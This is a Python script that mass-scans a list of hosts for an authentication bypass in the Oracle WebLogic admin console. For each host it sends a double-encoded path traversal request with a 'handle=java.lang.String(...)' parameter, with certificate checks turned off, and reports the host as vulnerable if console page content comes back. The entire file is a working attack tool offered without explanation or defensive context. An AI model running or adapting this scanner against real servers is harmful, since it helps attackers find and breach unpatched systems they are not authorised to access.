import requests

requests.packages.urllib3.disable_warnings()
headers_wls_1213 = {
 'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
 'Content-Type':'text/xml'
}



def main():
 for target in open("target.txt"):
  target = target.strip()
  url = "http://" + target + '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")'
  try:

   bypass_1 = requests.get(url, headers = headers_wls_1213,timeout = 3, verify = False)
   if "quicklinksrowout" in bypass_1.text:
    print ("[+] " + target + " is vulnerable!")
   else:
    print ("[-] " + target + " is not vulnerable!")
  except Exception as e:
   pass

if __name__=="__main__":
 main()

